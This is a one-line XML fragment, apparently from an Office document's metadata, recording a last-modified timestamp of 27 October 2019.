  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-10-27T11:30:00Z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